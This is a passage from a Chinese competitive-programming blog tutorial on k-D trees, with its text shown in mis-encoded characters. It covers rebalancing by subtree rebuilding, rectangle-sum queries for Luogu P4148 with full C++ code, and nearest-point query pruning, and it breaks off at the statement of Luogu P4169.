class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    t[p].sz=t[ls].sz+t[rs].sz+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">rebuild</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> k)</span><span class="comment">//ç±»ä¼¼é™æ€å»ºæ ‘ ï¼Œå‚æ•°æœ‰æ‰€æ”¹å˜</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(l&gt;r)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">	K=k;</span><br><span class="line">	<span class="built_in">nth_element</span>(g+l,g+mid,g+r+<span class="number">1</span>,cmp);<span class="comment">//æ³¨æ„è¿™é‡Œä¼ çš„æ˜¯æ‹å‡ºçš„åºåˆ—</span></span><br><span class="line">	t[g[mid]].ls=<span class="built_in">rebuild</span>(l,mid<span class="number">-1</span>,k^<span class="number">1</span>);</span><br><span class="line">	t[g[mid]].rs=<span class="built_in">rebuild</span>(mid+<span class="number">1</span>,r,k^<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">update</span>(g[mid]);</span><br><span class="line">	<span class="keyword">return</span> g[mid];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">check</span><span class="params">(<span class="type">int</span> &amp;p,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> ls=t[p].ls;</span><br><span class="line">	<span class="type">int</span> rs=t[p].rs;</span><br><span class="line">	<span class="keyword">if</span>(A*t[p].sz&lt;<span class="built_in">max</span>(t[ls].sz,t[rs].sz))<span class="comment">//Aä¸ºå¹³è¡¡å› å­</span></span><br><span class="line">	&#123;</span><br><span class="line">		tot=<span class="number">0</span>;<span class="comment">//æ¸…ç©ºåºåˆ—</span></span><br><span class="line">		<span class="built_in">pia</span>(p);<span class="comment">//æŠŠä»¥pä¸ºæ ¹çš„å­æ ‘æ‹æˆåºåˆ—ï¼Œæ–¹ä¾¿é‡æ„</span></span><br><span class="line">		p=<span class="built_in">rebuild</span>(<span class="number">1</span>,tot,k);<span class="comment">//æš´åŠ›é‡æ„ï¼Œå¹¶æ›´æ–°pç‚¹ç¼–å·</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>å†æ¥ä¸€é“ä¾‹é¢˜ï¼</p>
<h4 id="æ´›è°·-P4148-ç®€å•é¢˜"><a href="#æ´›è°·-P4148-ç®€å•é¢˜" class="headerlink" title="æ´›è°· P4148 ç®€å•é¢˜"></a>æ´›è°· P4148 ç®€å•é¢˜</h4><p>ç»™ä¸€ä¸ª $N\times N$ çš„æ£‹ç›˜ï¼Œæ¯ä¸ªæ ¼å­é‡Œæœ‰ä¸€ä¸ªæ•´æ•°ï¼Œåˆå§‹æ—¶éƒ½ä¸º $0$ï¼Œç°åœ¨éœ€è¦ç»´æŠ¤ä¸¤ç§æ“ä½œï¼š</p>
<p><code>1 x y A</code> å°†æ ¼å­ <code>x</code>ï¼Œ<code>y</code> é‡Œçš„æ•°å­—åŠ ä¸Š $A$ã€‚</p>
<p><code>2 x1 y1 x2 y2</code> è¾“å‡º $x1,y1,x2,y2$ è¿™ä¸ªçŸ©å½¢å†…çš„æ•°å­—å’Œã€‚</p>
<p>$N\leq5\times10^5$</p>
<p><strong>å¼ºåˆ¶åœ¨çº¿ï¼Œå†…å­˜é™åˆ¶ $20MB$</strong></p>
<p>éå¸¸é…·çš„é¢˜ï¼Œå¼ºåˆ¶åœ¨çº¿å¡æ‰äº† CDQåˆ†æ²»ï¼Œå†…å­˜é™åˆ¶ $20MB$ å¡æ‰äº†æ ‘å¥—æ ‘ï¼Œè¿˜æ˜¯è€å®ç”¨k-D Treeå§ï¼</p>
<p>è§‚å¯Ÿåˆ° $N$ éå¸¸å¤§ï¼Œæˆ‘ä»¬ä¸å¯èƒ½æŠŠæ£‹ç›˜ä¸­æ¯ä¸ªç‚¹åŠ åˆ°k-d Treeä¸­ã€‚ç”±äºåˆå§‹æ—¶æ¯ä¸ªç‚¹çš„å€¼éƒ½æ˜¯ $0$ï¼Œæˆ‘ä»¬è€ƒè™‘æ“ä½œ $1$ï¼Œç»™ $(x,y)$ ä¸Šçš„ç‚¹åŠ ä¸Š $A$ å¯ä»¥çœ‹ä½œåœ¨ $(x,y)$ æ’å…¥ä¸€ä¸ªæƒå€¼ä¸º $A$ çš„ç‚¹ã€‚å¦‚æœæˆ‘ç»™åŒä¸€ä¸ªä½ç½®åŠ ä¸¤æ¬¡æ€ä¹ˆåŠå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥æŠŠå®ƒçœ‹ä½œä¸¤ä¸ªä¸åŒçš„ç‚¹ï¼Œå› ä¸ºæˆ‘ä»¬æŸ¥è¯¢çš„æ˜¯çŸ©å½¢å†…çš„æ•°å­—å’Œï¼ŒæŠŠåŒä¸€ä¸ªä½ç½®æ‹†å¼€å¹¶ä¸å½±å“ç­”æ¡ˆã€‚</p>
<p>æ’å…¥æ“ä½œè§£å†³äº†ï¼Œç°åœ¨è€ƒè™‘å¦‚ä½•æŸ¥è¯¢ã€‚</p>
<p>å¦‚æœå½“å‰èŠ‚ç‚¹ç»´æŠ¤çš„åŒºåŸŸå®Œå…¨è¢«è¯¢é—®çš„çŸ©å½¢åŒ…å«ï¼Œé‚£è¯´æ˜å®ƒå­æ ‘ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½è¢«åŒ…å«ï¼Œç›´æ¥è¿”å›æƒå€¼å’Œã€‚</p>
<p>å¦‚æœå½“å‰èŠ‚ç‚¹ç»´æŠ¤çš„åŒºåŸŸå’Œè¯¢é—®çš„çŸ©å½¢å®Œå…¨æ²¡æœ‰äº¤é›†ï¼Œé‚£è¯´æ˜å®ƒå­æ ‘ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½ä¸åœ¨çŸ©å½¢ä¸­ï¼Œç›´æ¥è¿”å› $0$ã€‚</p>
<p>å¦‚æœå½“å‰èŠ‚ç‚¹ç»´æŠ¤çš„ç‚¹åœ¨çŸ©å½¢å†…ï¼Œç»™ç­”æ¡ˆåŠ ä¸Šè¿™ä¸ªç‚¹çš„æƒå€¼ã€‚</p>
<p>å‰©ä¸‹çš„å°±å¯ä»¥ç›´æ¥é€’å½’è¯¥èŠ‚ç‚¹çš„å·¦å³å­æ ‘ï¼Œç´¯åŠ ç­”æ¡ˆå³å¯ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>((!p)|| t[p].mn[<span class="number">0</span>]&gt;X2 || t[p].mx[<span class="number">0</span>]&lt;X1 || t[p].mn[<span class="number">1</span>]&gt;Y2 || t[p].mx[<span class="number">1</span>]&lt;Y1)<span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//æ²¡äº¤é›†</span></span><br><span class="line">	<span class="keyword">if</span>(t[p].mn[<span class="number">0</span>]&gt;=X1 &amp;&amp; t[p].mx[<span class="number">0</span>]&lt;=X2 &amp;&amp; t[p].mn[<span class="number">1</span>]&gt;=Y1 &amp;&amp; t[p].mx[<span class="number">1</span>]&lt;=Y2)<span class="keyword">return</span> t[p].sum;<span class="comment">//è¢«å®Œå…¨åŒ…å«</span></span><br><span class="line">	<span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(t[p].d[<span class="number">0</span>]&gt;=X1 &amp;&amp; t[p].d[<span class="number">0</span>]&lt;=X2 &amp;&amp; t[p].d[<span class="number">1</span>]&gt;=Y1 &amp;&amp; t[p].d[<span class="number">1</span>]&lt;=Y2)ans+=t[p].val;<span class="comment">//ç»´æŠ¤çš„ç‚¹åœ¨çŸ©å½¢ä¸­</span></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">query</span>(t[p].ls)+<span class="built_in">query</span>(t[p].rs)+ans;<span class="comment">//é€’å½’å·¦å³å­æ ‘</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å®Œæ•´ä»£ç  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX=<span class="number">2e5</span>+<span class="number">5</span>;</span><br><span class="line"><span class="type">int</span> K=<span class="number">0</span>,last_ans=<span class="number">0</span>,N=<span class="number">0</span>,cur=<span class="number">0</span>,tot=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> X1,X2,Y1,Y2;</span><br><span class="line"><span class="type">double</span> A=<span class="number">0.75</span>;</span><br><span class="line"><span class="type">int</span> g[MAX];</span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read</span><span class="params">(T &amp;x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	x=<span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> f=<span class="number">1</span>;</span><br><span class="line">	<span class="type">char</span> ch=<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>)f=<span class="number">-1</span>;</span><br><span class="line">		ch=<span class="built_in">getchar</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">	&#123;</span><br><span class="line">		x=x*<span class="number">10</span>+(ch^<span class="number">48</span>);</span><br><span class="line">		ch=<span class="built_in">getchar</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	x*=f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> d[<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> mx[<span class="number">2</span>],mn[<span class="number">2</span>];</span><br><span class="line">	<span class="type">int</span> sum,val,sz;</span><br><span class="line">	<span class="type">int</span> ls,rs;</span><br><span class="line">&#125;t[MAX];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">newnode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ++cur;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> t[a].d[K]&lt;t[b].d[K];</span><br><span class="line">&#125;	</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">update</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> ls=t[x].ls;</span><br><span class="line">	<span class="type">int</span> rs=t[x].rs;</span><br><span class="line">	t[x].sz=t[ls].sz+t[rs].sz+<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">1</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		t[x].mx[i]=t[x].mn[i]=t[x].d[i];</span><br><span class="line">		<span class="keyword">if</span>(ls)</span><br><span class="line">		&#123;</span><br><span class="line">			t[x].mx[i]=<span class="built_in">max</span>(t[x].mx[i],t[ls].mx[i]);</span><br><span class="line">			t[x].mn[i]=<span class="built_in">min</span>(t[x].mn[i],t[ls].mn[i]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(rs)</span><br><span class="line">		&#123;</span><br><span class="line">			t[x].mx[i]=<span class="built_in">max</span>(t[x].mx[i],t[rs].mx[i]);</span><br><span class="line">			t[x].mn[i]=<span class="built_in">min</span>(t[x].mn[i],t[rs].mn[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	t[x].sum=t[ls].sum+t[rs].sum+t[x].val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pia</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!p)<span class="keyword">return</span>;</span><br><span class="line">	<span class="built_in">pia</span>(t[p].ls);</span><br><span class="line">	g[++tot]=p;</span><br><span class="line">	<span class="built_in">pia</span>(t[p].rs);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">rebuild</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(l&gt;r)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">	K=k;</span><br><span class="line">	<span class="built_in">nth_element</span>(g+l,g+mid,g+r+<span class="number">1</span>,cmp);</span><br><span class="line">	t[g[mid]].ls=<span class="built_in">rebuild</span>(l,mid<span class="number">-1</span>,k^<span class="number">1</span>);</span><br><span class="line">	t[g[mid]].rs=<span class="built_in">rebuild</span>(mid+<span class="number">1</span>,r,k^<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">update</span>(g[mid]);</span><br><span class="line">	<span class="keyword">return</span> g[mid];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">check</span><span class="params">(<span class="type">int</span> &amp;p,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> ls=t[p].ls;</span><br><span class="line">	<span class="type">int</span> rs=t[p].rs;</span><br><span class="line">	<span class="keyword">if</span>(A*t[p].sz&lt;<span class="built_in">max</span>(t[ls].sz,t[rs].sz))</span><br><span class="line">	&#123;</span><br><span class="line">		tot=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">pia</span>(p);</span><br><span class="line">		p=<span class="built_in">rebuild</span>(<span class="number">1</span>,tot,k);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> &amp;p,node temp,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!p)</span><br><span class="line">	&#123;</span><br><span class="line">		p=<span class="built_in">newnode</span>();</span><br><span class="line">		t[p]=temp;</span><br><span class="line">		t[p].rs=<span class="number">0</span>,t[p].ls=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">update</span>(p);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(temp.d[k]&lt;=t[p].d[k])<span class="built_in">insert</span>(t[p].ls,temp,k^<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">insert</span>(t[p].rs,temp,k^<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">update</span>(p);</span><br><span class="line">	<span class="built_in">check</span>(p,k);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>((!p)|| t[p].mn[<span class="number">0</span>]&gt;X2 || t[p].mx[<span class="number">0</span>]&lt;X1 || t[p].mn[<span class="number">1</span>]&gt;Y2 || t[p].mx[<span class="number">1</span>]&lt;Y1)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(t[p].mn[<span class="number">0</span>]&gt;=X1 &amp;&amp; t[p].mx[<span class="number">0</span>]&lt;=X2 &amp;&amp; t[p].mn[<span class="number">1</span>]&gt;=Y1 &amp;&amp; t[p].mx[<span class="number">1</span>]&lt;=Y2)<span class="keyword">return</span> t[p].sum;</span><br><span class="line">	<span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(t[p].d[<span class="number">0</span>]&gt;=X1 &amp;&amp; t[p].d[<span class="number">0</span>]&lt;=X2 &amp;&amp; t[p].d[<span class="number">1</span>]&gt;=Y1 &amp;&amp; t[p].d[<span class="number">1</span>]&lt;=Y2)ans+=t[p].val;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">query</span>(t[p].ls)+<span class="built_in">query</span>(t[p].rs)+ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n,root=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">read</span>(n);</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> opt;</span><br><span class="line">		<span class="built_in">read</span>(opt);</span><br><span class="line">		<span class="keyword">if</span>(opt==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			node temp;</span><br><span class="line">			<span class="built_in">read</span>(temp.d[<span class="number">0</span>]);</span><br><span class="line">			<span class="built_in">read</span>(temp.d[<span class="number">1</span>]);</span><br><span class="line">			<span class="built_in">read</span>(temp.val);</span><br><span class="line">			temp.d[<span class="number">0</span>]^=last_ans,temp.d[<span class="number">1</span>]^=last_ans,temp.val^=last_ans;</span><br><span class="line">			<span class="built_in">insert</span>(root,temp,<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(opt==<span class="number">2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">read</span>(X1),<span class="built_in">read</span>(Y1),<span class="built_in">read</span>(X2),<span class="built_in">read</span>(Y2);</span><br><span class="line">			X1^=last_ans,X2^=last_ans,Y1^=last_ans,Y2^=last_ans;</span><br><span class="line">			<span class="keyword">if</span>(X1&gt;X2)<span class="built_in">swap</span>(X1,X2);</span><br><span class="line">			<span class="keyword">if</span>(Y1&gt;Y2)<span class="built_in">swap</span>(Y1,Y2);</span><br><span class="line">			last_ans=<span class="built_in">query</span>(root);</span><br><span class="line">			cout&lt;&lt;last_ans&lt;&lt;endl;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(opt==<span class="number">3</span>)<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="æŸ¥è¯¢"><a href="#æŸ¥è¯¢" class="headerlink" title="æŸ¥è¯¢"></a>æŸ¥è¯¢</h3><p>æœ€ç»å…¸çš„ä¸€ä¸ªè¯¢é—®å°±æ˜¯æœ€è¿‘ç‚¹æŸ¥è¯¢ï¼Œä¾‹å¦‚å·²ç»ç»™äº†ä½  $n$ ä¸ªäºŒç»´å¹³é¢ä¸Šçš„ç‚¹ï¼Œç°åœ¨ç»™ä½ ä¸€ä¸ªç‚¹ $Q$ï¼Œé—®ä½ è¿™ $n$ ä¸ªç‚¹ä¸­è·ç¦» $Q$ æœ€è¿‘çš„æ˜¯å“ªä¸ªã€‚</p>
<p>å…³äºè¿™ä¸ªè·ç¦»ï¼Œ<strong>æ¬§å‡ é‡Œå¾—è·ç¦»</strong> å’Œ <strong>æ›¼å“ˆé¡¿è·ç¦»</strong> çš„æŸ¥è¯¢æ–¹æ³•éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯è®¡ç®—ä¸Šæœ‰æ‰€ä¸åŒï¼Œå…·ä½“çš„å¯ä»¥ä¾‹é¢˜ä¸Šè§£é‡Šã€‚</p>
<p>æˆ‘ä»¬å›å½’æ­£é¢˜ï¼Œè¿™ä¸ªæœ€è¿‘ç‚¹è¯¥æ€ä¹ˆæŸ¥è¯¢å‘¢ï¼Ÿå¾ˆæ˜¾ç„¶ï¼Œç›´æ¥éå† $n$ ä¸ªç‚¹æ˜¯å¾ˆä¸ç°å®çš„ï¼Œæˆ‘ä»¬è€ƒè™‘å¦‚ä½•ä»k-D Treeä¸Šæœåˆ°ç­”æ¡ˆã€‚</p>
<h4 id="å‰ªæ"><a href="#å‰ªæ" class="headerlink" title="å‰ªæ"></a>å‰ªæ</h4><p><img src="https://cdn.luogu.com.cn/upload/image_hosting/qzdqykes.png"></p>
<p>å‡å¦‚æˆ‘ä»¬å½“å‰æœåˆ°äº†k-D Treeä¸Šçš„ç‚¹ $p$ï¼Œå…ˆæ›´æ–°ä¸€ä¸‹æœ€çŸ­è·ç¦» $ans&#x3D;min(ans,dis(p,Q))$ã€‚</p>
<p>æ¥ä¸‹æ¥é€’å½’å·¦å­æ ‘å’Œå³å­æ ‘ï¼Œä¸ºäº†é™ä½æˆ‘ä»¬çš„æ—¶é—´å¤æ‚åº¦ï¼Œæˆ‘ä»¬å¯ä»¥å‰ªæï¼Œå…·ä½“æ˜¯è¿™æ ·çš„ã€‚</p>
<ol>
<li>åˆ†åˆ«è®¡ç®—å‡ºç‚¹ $Q$ åˆ°ç‚¹ $p$ çš„å·¦å­æ ‘å’Œå³å­æ ‘æ‰€ç®¡è¾–çŸ©å½¢çš„è·ç¦»ï¼Œè®°ä¸º $disls$ å’Œ $disrs$ã€‚</li>
<li>æ¯”è¾ƒ $disls$ å’Œ $disrs$ï¼Œå¦‚æœ $disls\lt disrs$ï¼Œåˆ™å…ˆé€’å½’å·¦å­æ ‘ï¼Œå¦åˆ™å…ˆé€’å½’å³å­æ ‘ã€‚</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">query</span><span class="params">(<span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ans=<span class="built_in">min</span>(ans,<span class="built_in">dis</span>(p));</span><br><span class="line">	<span class="type">int</span> disls=INF;</span><br><span class="line">	<span class="type">int</span> disrs=INF;</span><br><span class="line">	<span class="keyword">if</span>(t[p].ls)disls=<span class="built_in">dismatrix</span>(t[p].ls);<span class="comment">//è®¡ç®—æŸ¥è¯¢ç‚¹åˆ°å·¦å­æ ‘ç®¡è¾–çŸ©å½¢çš„è·ç¦»</span></span><br><span class="line">	<span class="keyword">if</span>(t[p].rs)disrs=<span class="built_in">dismatrix</span>(t[p].rs);<span class="comment">//è®¡ç®—æŸ¥è¯¢ç‚¹åˆ°å³å­æ ‘ç®¡è¾–çŸ©å½¢çš„è·ç¦»</span></span><br><span class="line">	<span class="keyword">if</span>(disls&lt;disrs)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(disls&lt;ans)<span class="built_in">query</span>(t[p].ls);<span class="comment">//å…ˆé€’å½’å·¦å­æ ‘</span></span><br><span class="line">		<span class="keyword">if</span>(disrs&lt;ans)<span class="built_in">query</span>(t[p].rs);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(disrs&lt;ans)<span class="built_in">query</span>(t[p].rs);<span class="comment">//å…ˆé€’å½’å³å­æ ‘</span></span><br><span class="line">		<span class="keyword">if</span>(disls&lt;ans)<span class="built_in">query</span>(t[p].ls);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‘ç°ï¼Œå¦‚æœæˆ‘ä»¬å…ˆé€’å½’å·¦å­æ ‘ï¼Œæ›´æ–°äº†ç­”æ¡ˆä»¥åï¼Œå¦‚æœå³å­æ ‘ç®¡è¾–çŸ©å½¢åˆ°æŸ¥è¯¢ç‚¹çš„è·ç¦»å¤§äºå·²æ›´æ–°çš„ç­”æ¡ˆï¼Œå°±ç›´æ¥è·³è¿‡äº†ï¼Œè¿™æ ·æˆ‘ä»¬å°±å®Œç¾åœ°åšåˆ°äº†å‰ªæã€‚</p>
<h4 id="æ´›è°·-P4169-Violet-å¤©ä½¿ç©å¶-SJYæ‘†æ£‹å­"><a href="#æ´›è°·-P4169-Violet-å¤©ä½¿ç©å¶-SJYæ‘†æ£‹å­" class="headerlink" title="æ´›è°· P4169 [Violet] å¤©ä½¿ç©å¶&#x2F;SJYæ‘†æ£‹å­"></a>æ´›è°· P4169 [Violet] å¤©ä½¿ç©å¶&#x2F;SJYæ‘†æ£‹å­</h4><p>åœ¨äºŒç»´å¹³é¢ä¸Šï¼Œç»™å‡º $n$ ä¸ªç‚¹ $(x,y)$ï¼Œä»¥åŠ $m$ ä¸ªæ“ä½œã€‚</p>
<p><code>1 x y</code> æ·»åŠ ä¸€ä¸ªç‚¹ $(x,y)$ã€‚</p>
<p><code>2 x y</code> æŸ¥è¯¢æ‰€æœ‰ç‚¹ä¸­ï¼Œè·ç¦» $(x,y)$ æœ€è¿‘çš„ä¸€ä¸ªç‚¹ã€‚</p>
<p><strong>æœ¬é¢˜ä¸­ï¼Œè·ç¦»æŒ‡æ›¼å“ˆé¡¿è·ç¦»</strong>ï¼Œå³ $dist(A,B)&#x3D;|A_x-B_x|+|A_y-B_y|$</p>
